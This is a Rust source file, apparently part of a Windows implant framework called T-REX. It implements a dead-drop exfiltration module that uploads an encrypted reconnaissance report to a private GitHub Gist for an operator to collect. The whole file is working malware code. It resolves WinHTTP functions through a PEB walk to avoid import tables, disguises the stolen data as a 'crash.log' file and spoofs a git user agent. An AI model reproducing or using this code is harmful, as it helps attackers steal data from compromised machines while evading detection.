//! T-REX GitHub Gist Dead Drop Resolver.
//!
//! Uploads an encrypted recon report to a private GitHub Gist via the Gist API
//! and returns the Gist ID for C2 retrieval. Classic dead-drop resolver pattern:
//! the implant uploads to a trusted third-party service — no direct C2
//! communication required for exfiltration. The operator polls the same Gist to
//! collect the report.
//!
//! # API Flow
//! 1. Encrypt report with the provided key (caller handles encryption).
//! 2. Base64-encode the ciphertext.
//! 3. Build JSON body: `{"public":false,"files":{"crash.log":{"content":"<b64>"}}}`
//! 4. POST to `https://api.github.com/gists` with PAT auth.
//! 5. Parse JSON response → extract `id` and `html_url`.
//! 6. Return [`GistResult`].
//!
//! # References
//! - Delta ThreatLabs (2026): Dead Drop Resolver taxonomy — GitHub Gist /
//!   Pastebin as C2 carriers.
//! - Cloudflare 2026 Threat Report: FrumpyToad (China) uses Google Calendar;
//!   NastyShrew (Russia) uses Pastebin.
//! - GitHub REST API v3: `POST /gists`.
//! - Existing pattern: [`crate::transport`] for WinHTTP POST via PEB walk.

#![cfg(target_os = "windows")]

use crate::heap::{vec, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;

// ---- WinHTTP constants ----------------------------------------------------

/// Default proxy auto-detection.
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
/// Enables TLS (HTTPS) on the request handle.
const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;
/// HTTPS well-known port.
const INTERNET_DEFAULT_HTTPS_PORT: u16 = 443;
/// Add header if new; replace if exists.
const WINHTTP_ADDREQ_FLAG_ADD: u32 = 0x2000_0000;
const WINHTTP_ADDREQ_FLAG_REPLACE: u32 = 0x8000_0000;
/// Combined add-or-replace flag for `WinHttpAddRequestHeaders`.
const HDR_FLAGS: u32 = WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE;

/// Cap on the total Gist API response body (32 KiB — a single-gist response
/// is typically under 2 KiB).
const MAX_RESPONSE_BYTES: usize = 32 * 1024;

/// Per-read chunk size for `WinHttpReadData`.
const READ_CHUNK: usize = 4096;

// ---- WinHTTP function-pointer types (PEB-resolved) ------------------------

type HINTERNET = *mut c_void;

type WinHttpOpenFn =
    unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;

type WinHttpConnectFn =
    unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;

type WinHttpOpenRequestFn = unsafe extern "system" fn(
    HINTERNET,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *const *const u16,
    u32,
    u32,
) -> HINTERNET;

type WinHttpSendRequestFn =
    unsafe extern "system" fn(HINTERNET, *const u8, u32, *const u8, u32, u32, usize) -> i32;

type WinHttpReceiveResponseFn =
    unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;

type WinHttpReadDataFn =
    unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;

type WinHttpCloseHandleFn =
    unsafe extern "system" fn(HINTERNET) -> i32;

type WinHttpQueryDataAvailableFn =
    unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;

type WinHttpAddRequestHeadersFn =
    unsafe extern "system" fn(HINTERNET, *const u16, u32, u32) -> i32;

/// Resolved WinHTTP function table (lazily populated once).
struct WinhttpFns {
    open: WinHttpOpenFn,
    connect: WinHttpConnectFn,
    open_request: WinHttpOpenRequestFn,
    send_request: WinHttpSendRequestFn,
    receive_response: WinHttpReceiveResponseFn,
    read_data: WinHttpReadDataFn,
    close_handle: WinHttpCloseHandleFn,
    query_data: WinHttpQueryDataAvailableFn,
    add_request_headers: WinHttpAddRequestHeadersFn,
}

// ---- Public API types -----------------------------------------------------

/// Result of a successful Gist upload.
pub struct GistResult {
    /// GitHub Gist ID (null-terminated lowercase hex, e.g. `"a1b2c3\0"`).
    pub gist_id: [u8; 32],
    /// Gist HTML URL (null-terminated, e.g.
    /// `"https://gist.github.com/a1b2c3\0"`).
    pub html_url: [u8; 64],
}

// ---- Lazy WinHTTP resolution (PEB walk, no IAT) --------------------------

static mut WINHTTP: Option<WinhttpFns> = None;

/// Resolve every WinHTTP function needed for the Gist upload, once.
/// If `winhttp.dll` cannot be loaded or any required export is missing, the
/// static stays `None` and [`upload_gist`] returns `Err("WinHTTP unresolved")`.
unsafe fn ensure_winhttp() {
    use core::sync::atomic::{AtomicBool, Ordering};

    static DONE: AtomicBool = AtomicBool::new(false);
    if DONE.load(Ordering::Acquire) {
        return;
    }

    // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
    // kernel32 and force-load it.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let lla = export_addr(b"kernel32.dll", b"LoadLibraryA");
    let mut loaded = false;
    if let Some(addr) = lla {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"winhttp.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            loaded = true;
        }
    }
    if !loaded {
        DONE.store(true, Ordering::Release);
        return;
    }

    let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
    let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
    let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
    let s = export_addr(b"winhttp.dll", b"WinHttpSendRequest");
    let v = export_addr(b"winhttp.dll", b"WinHttpReceiveResponse");
    let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
    let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
    let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
    let arh = export_addr(b"winhttp.dll", b"WinHttpAddRequestHeaders");

    if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q), Some(arh)) =
        (o, c, r, s, v, d, cl, q, arh)
    {
        WINHTTP = Some(WinhttpFns {
            open: core::mem::transmute(o),
            connect: core::mem::transmute(c),
            open_request: core::mem::transmute(r),
            send_request: core::mem::transmute(s),
            receive_response: core::mem::transmute(v),
            read_data: core::mem::transmute(d),
            close_handle: core::mem::transmute(cl),
            query_data: core::mem::transmute(q),
            add_request_headers: core::mem::transmute(arh),
        });
    }

    DONE.store(true, Ordering::Release);
}

// ---- Helpers ---------------------------------------------------------------

/// Convert an ASCII byte slice to a null-terminated UTF-16 buffer for WinHTTP.
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut out = vec![0u16; s.len() + 1];
    for (i, &b) in s.iter().enumerate() {
        out[i] = b as u16;
    }
    out
}

/// Base64-encode `data` using the standard alphabet (`A-Za-z0-9+/`).
/// Returns a new [`Vec<u8>`] — the caller owns the allocation.
fn base64_encode(data: &[u8]) -> Vec<u8> {
    const TABLE: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let out_len = ((data.len() + 2) / 3) * 4;
    let mut out = vec![0u8; out_len];
    let mut oi: usize = 0;
    let mut i: usize = 0;

    // Process full 3-byte triples.
    while i + 2 < data.len() {
        let n = ((data[i] as u32) << 16) | ((data[i + 1] as u32) << 8) | (data[i + 2] as u32);
        out[oi] = TABLE[((n >> 18) & 0x3F) as usize];
        out[oi + 1] = TABLE[((n >> 12) & 0x3F) as usize];
        out[oi + 2] = TABLE[((n >> 6) & 0x3F) as usize];
        out[oi + 3] = TABLE[(n & 0x3F) as usize];
        oi += 4;
        i += 3;
    }

    // Remainder.
    match data.len() - i {
        2 => {
            let n = ((data[i] as u32) << 16) | ((data[i + 1] as u32) << 8);
            out[oi] = TABLE[((n >> 18) & 0x3F) as usize];
            out[oi + 1] = TABLE[((n >> 12) & 0x3F) as usize];
            out[oi + 2] = TABLE[((n >> 6) & 0x3F) as usize];
            out[oi + 3] = b'=';
        }
        1 => {
            let n = (data[i] as u32) << 16;
            out[oi] = TABLE[((n >> 18) & 0x3F) as usize];
            out[oi + 1] = TABLE[((n >> 12) & 0x3F) as usize];
            out[oi + 2] = b'=';
            out[oi + 3] = b'=';
        }
        _ => {}
    }

    out
}

/// Extract the value of a JSON string key from a raw response body.
///
/// Searches for `"<key>":"` and returns the bytes between the double quotes
/// that follow. Handles `\"` escape sequences inside the value. Returns
/// `None` if the key is absent or the value is not a string.
fn json_extract_str<'a>(response: &'a [u8], key: &[u8]) -> Option<&'a [u8]> {
    let mut pos: usize = 0;

    while pos + key.len() + 4 <= response.len() {
        if response[pos] != b'"' {
            pos += 1;
            continue;
        }

        let kstart = pos + 1;
        // Match "<key>":
        if kstart + key.len() >= response.len()
            || &response[kstart..kstart + key.len()] != key
            || response[kstart + key.len()] != b'"'
            || response[kstart + key.len() + 1] != b':'
        {
            pos += 1;
            continue;
        }

        // Key matched. Skip past `:` and any JSON whitespace.
        let mut vstart = kstart + key.len() + 2;
        while vstart < response.len() {
            let b = response[vstart];
            if b != b' ' && b != b'\t' && b != b'\n' && b != b'\r' {
                break;
            }
            vstart += 1;
        }

        if vstart >= response.len() || response[vstart] != b'"' {
            return None;
        }
        vstart += 1; // skip opening quote

        // Scan to the closing quote, skipping `\"` escapes.
        let mut vend = vstart;
        while vend < response.len() {
            if response[vend] == b'\\' {
                vend += 2; // skip escape + escaped char
            } else if response[vend] == b'"' {
                return Some(&response[vstart..vend]);
            } else {
                vend += 1;
            }
        }

        return None;
    }

    None
}

// ---- Gist Upload ----------------------------------------------------------

/// Upload an encrypted recon report to GitHub Gist via the REST API.
///
/// # Arguments
/// * `pat_token` — GitHub Personal Access Token (e.g. `"ghp_xxxx…"`).
/// * `encrypted_payload` — already-encrypted ciphertext. The caller owns
///   encryption; this function only handles transport encoding (Base64).
///
/// # Returns
/// * `Ok(`[`GistResult`]`)` — `gist_id` and `html_url` populated with the
///   GitHub-assigned identifiers.
/// * `Err(&str)` — a human-readable failure reason.
///
/// # Safety
///
/// Calls raw WinHTTP FFI via PEB-resolved function pointers. The caller must
/// ensure the process is not terminating and that `winhttp.dll` can be
/// loaded (present on all supported Windows versions ≥ 7 SP1).
pub unsafe fn upload_gist(
    pat_token: &str,
    encrypted_payload: &[u8],
) -> Result<GistResult, &'static str> {
    ensure_winhttp();
    let fns = WINHTTP.as_ref().ok_or("WinHTTP unresolved")?;

    // 1. Base64-encode the ciphertext.
    let b64 = base64_encode(encrypted_payload);

    // 2. Build JSON body:
    //    {"public":false,"files":{"crash.log":{"content":"<b64>"}}}
    //    The `crash.log` filename is a classic dead-drop disguise
    //    (plausible filename for a "debug" Gist).
    const JSON_PREFIX: &[u8] =
        b"{\"public\":false,\"files\":{\"crash.log\":{\"content\":\"";
    const JSON_SUFFIX: &[u8] = b"\"}}}";

    let mut json_body: Vec<u8> =
        Vec::with_capacity(JSON_PREFIX.len() + b64.len() + JSON_SUFFIX.len());
    json_body.extend_from_slice(JSON_PREFIX);
    json_body.extend_from_slice(&b64);
    json_body.extend_from_slice(JSON_SUFFIX);

    // 3. Convert strings to UTF-16 once (reused across WinHTTP calls).
    let ua = to_utf16(b"git/2.45.0");
    let host = to_utf16(b"api.github.com");
    let verb = to_utf16(b"POST");
    let path = to_utf16(b"/gists");

    // 4. WinHttpOpen — begin HTTP session.
    let session = (fns.open)(
        ua.as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        core::ptr::null(),
        core::ptr::null(),
        0,
    );
    if session.is_null() {
        return Err("WinHttpOpen failed");
    }

    // 5. WinHttpConnect — connect to api.github.com:443 (HTTPS).
    let conn = (fns.connect)(session, host.as_ptr(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return Err("WinHttpConnect failed");
    }

    // 6. WinHttpOpenRequest — POST /gists with TLS.
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path.as_ptr(),
        core::ptr::null(), // HTTP/1.1
        core::ptr::null(), // no referrer
        core::ptr::null(), // default accept types
        0,
        WINHTTP_FLAG_SECURE,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return Err("WinHttpOpenRequest failed");
    }

    // 7. Set request headers: Authorization, Content-Type, User-Agent.
    //    Format: "Authorization: token <PAT>\r\nContent-Type: application/json\r\n"
    let auth_prefix = b"Authorization: token ";
    let ct_ua = b"\r\nContent-Type: application/json\r\n";
    let mut headers: Vec<u8> =
        Vec::with_capacity(auth_prefix.len() + pat_token.len() + ct_ua.len());
    headers.extend_from_slice(auth_prefix);
    headers.extend_from_slice(pat_token.as_bytes());
    headers.extend_from_slice(ct_ua);

    let headers16 = to_utf16(&headers);
    // WinHttpAddRequestHeaders needs length in characters, excluding the null
    // terminator (which `to_utf16` appends).
    let hdr_len = (headers16.len() - 1) as u32;
    if (fns.add_request_headers)(req, headers16.as_ptr(), hdr_len, HDR_FLAGS) == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return Err("WinHttpAddRequestHeaders failed");
    }

    // 8. WinHttpSendRequest — POST the JSON body.
    if (fns.send_request)(
        req,
        core::ptr::null(),          // no additional headers
        0,
        json_body.as_ptr(),
        json_body.len() as u32,
        json_body.len() as u32,     // total send length = body length
        0,                          // no context
    ) == 0
    {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return Err("WinHttpSendRequest failed");
    }

    // 9. WinHttpReceiveResponse — wait for the server reply.
    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return Err("WinHttpReceiveResponse failed");
    }

    // 10. Read the response body in bounded chunks.
    let mut response: Vec<u8> = Vec::new();
    loop {
        let mut avail: u32 = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        // Cap the per-read allocation at READ_CHUNK to avoid a single
        // oversized allocation on a malicious/MitM-influenced `avail` value.
        let capped = (avail as usize).min(READ_CHUNK);
        let mut chunk = vec![0u8; capped];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
            break;
        }
        let n = (read as usize).min(capped);
        // Reject oversized responses — guards the bump allocator against
        // a malicious server pushing past the virtual-region limit.
        if response.len().saturating_add(n) > MAX_RESPONSE_BYTES {
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return Err("response too large");
        }
        response.extend_from_slice(&chunk[..n]);
    }

    // 11. Clean up WinHTTP handles regardless of parse outcome.
    (fns.close_handle)(req);
    (fns.close_handle)(conn);
    (fns.close_handle)(session);

    if response.is_empty() {
        return Err("empty response");
    }

    // 12. Parse JSON — extract `id` and `html_url` string values.
    let id_bytes = json_extract_str(&response, b"id").ok_or("missing id in response")?;
    let url_bytes =
        json_extract_str(&response, b"html_url").ok_or("missing html_url in response")?;

    // 13. Populate GistResult, ensuring each field fits in its fixed buffer.
    let mut result = GistResult {
        gist_id: [0u8; 32],
        html_url: [0u8; 64],
    };

    let id_len = id_bytes.len();
    if id_len >= 32 {
        return Err("gist id too long");
    }
    result.gist_id[..id_len].copy_from_slice(id_bytes);

    let url_len = url_bytes.len();
    if url_len >= 64 {
        return Err("html_url too long");
    }
    result.html_url[..url_len].copy_from_slice(url_bytes);

    Ok(result)
}
